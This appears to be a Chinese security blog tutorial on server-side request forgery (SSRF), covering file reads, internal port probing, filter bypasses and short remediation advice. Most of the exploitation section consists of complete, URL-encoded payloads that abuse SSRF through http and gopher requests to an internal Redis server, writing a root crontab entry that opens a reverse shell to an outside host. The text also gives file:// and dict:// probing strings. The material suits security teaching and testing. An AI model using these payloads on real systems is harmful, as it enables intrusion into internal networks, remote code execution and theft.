#  一文读懂SSRF漏洞   
simple学安全  simple学安全   2024-11-20 10:56  
  
目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKz5ulJQIic4ickzQM8DBLKpwsVfibrbZQ1vhyCIs7yAB7CCiaRhzxg03QccQ/640?wx_fmt=png&from=appmsg "")  
  
简介  
  
SSRF全称服务器端请求伪造，是一种由攻击者构造请求，由服务器端发起请求的漏洞，正由于这一点，SSRF攻击的目标是外网无法访问的内网系统。  
  
漏洞出现的原因是web应用程序提供了从其他服务器应用获取数据的功能，却没有对目标地址做过滤和限制。导致存在漏洞的应用成为攻击者的跳板机。  
  
漏洞利用  
  
1、**读取服务器本地文件**  
  
利用  
file协议  
可以读取本地文件：  
```
Windows：
file://127.0.0.1/c:/      访问本地C盘
file://localhost/d:/      访问本地D盘
file:///e:/                访问本地E盘

Linux：
file:///etc/hosts
```  
  
现有 http://192.168.1.128/ssrf.php?url= 存在SSRF漏洞，可利用file协议读取本地文件：  
```
?url=file:///c:/windows/win.ini
?url=file://127.0.0.1/c:/windows/win.ini
?url=file://localhost/c:/windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKzYu8lW8iaibVHX2jwrpUT3PshdcSTfqfiaoBSQFc0JUalB8YsW6pg7BflA/640?wx_fmt=png&from=appmsg "")  
  
2、**收集内网信息**  
  
方法一：直接将参数值设置为内网地址，附带端口号，判断内网主机端口开放情况，这里探测到服务器开放3306端口  
```
?url=127.0.0.1:3306
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKzMwh3es6q69gyyHQzXru3PmhM3Bmwklib5PicEAlhLjnibnSCmcVkpbbgw/640?wx_fmt=png&from=appmsg "")  
  
方法二：利用  
dict协议  
探测端口，dict协议格式如下：  
```
dict://ip:port/命令:参数
```  
  
其中命令和参数不是必须的。  
  
使用dict协议探测到服务器开放3306端口：  
```
?url=dict://127.0.0.1:3306/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKzMB6ERHUzoWGkXZLTuyFyjnbXxp3tyt7ex1nCicf86QJuJ8iak7zxg3zg/640?wx_fmt=png&from=appmsg "")  
  
  
3、**攻击内网redis**  
  
ssrf漏洞常用于攻击内网redis服务，可先使用file协议读取服务器的网络配置文件，获得内网ip以及子网掩码，随后使用收集内网信息的方法探测内网的redis服务，常用端口6379。这里探测到172.19.0.2存在redis服务  
  
方法一：利用http协议  
  
1）redis是通过换行符区分每条命令的，可以使用%0d%0a代表换行符，达到一次传入多条命令的目的，利用redis写计划任务反弹shell：  
```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.11.132/4444 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```  
  
2）特殊字符进行url编码，换行符使用%0d%0a：  
```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.11.132%2F4444%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```  
  
3）拼接前还需要在前后加上一些字符表示开始和结束：  
```
开头：start%0d%0a%0d%0a
结尾：%0d%0a%0d%0aend

其中start和end可以是任何字符串，没有要求
```  
  
4）得到最终payload  
```
start%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.11.132%2F4444%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0d%0a%0d%0aend
```  
  
5）发送攻击请求包，成功反弹shell  
```
?url=http://172.19.0.2:6379/start%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.11.132%2F4444%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0d%0a%0d%0aend
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKzGzJOQApw2SeNib48xEM7SHCazv1rLVficvZ57ZlqfdHv0AQOSFT4Zpibw/640?wx_fmt=png&from=appmsg "")  
  
方法二：利用  
gopher协议  
攻击内网redis，gopher协议可以构造任意的tcp/ip数据包，格式如下：  
```
gopher://ip:port/_数据
```  
  
1）可用如下工具生成反弹shell的payload：  
  
https://github.com/tarunkant/Gopherus  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeU9QD61S9PKSqEcjVjSNztKzgaLoA92cae4Aiadm3enH3er0wlOlN9yvMaC4mBcAibCgE7CofISlKdvg/640?wx_fmt=png&from=appmsg "")  
  
其中127.0.0.1:6379要换成实际的存在redis服务的地址。  
  
2）由于服务端接受数据后会自动进行一次url解码，为了保持结构完整，需要对gopher协议的数据再进行一次url编码  
```
gopher://192.168.11.132:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252469%250D%250A%250A%250A%252A%2F1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-c%2520%2522sh%2520-i%2520%253E%2526%2520%2Fdev%2Ftcp%2F192.168.11.132%2F1234%25200%253E%25261%2522%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A%2Fvar%2Fspool%2Fcron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```  
  
3）最后作为参数发送请求包  
```
?url=gopher://192.168.11.132:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252469%250D%250A%250A%250A%252A%2F1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-c%2520%2522sh%2520-i%2520%253E%2526%2520%2Fdev%2Ftcp%2F192.168.11.132%2F1234%25200%253E%25261%2522%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A%2Fvar%2Fspool%2Fcron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```  
  
绕过技巧  
  
1、**本地回环地址**  
  
将本地回环地址http://127.0.0.1/改为http://127.1/  
  
2、**双重URL编码混淆**  
  
对请求的url进行双重url编码，例如http://127.1/admin改为http://127.1/%2561dmin，对a进行了双重url编码。  
  
3、**"@"符号绕过**  
  
该绕过的原理是http://  
127  
.0.0.1  
/a  
dmin与http://xxx.com@127.0.0.1/admin  
这两个请求是  
一样的  
，  
也就是说  
对于限制了域名的网站，可以通过这种方法实现绕过  
  
修复建议  
  
1、限制请求的端口只能为web端口，例如80、8080  
  
2、只允许发起http和https的请求  
  
3、采用白名单的方式限制访问的目标地址，禁止访问内网ip  
  
4、屏蔽返回的详细信息  
  
END  
  
**查看更多精彩内容，关注**  
**simple学安全**  
  
  
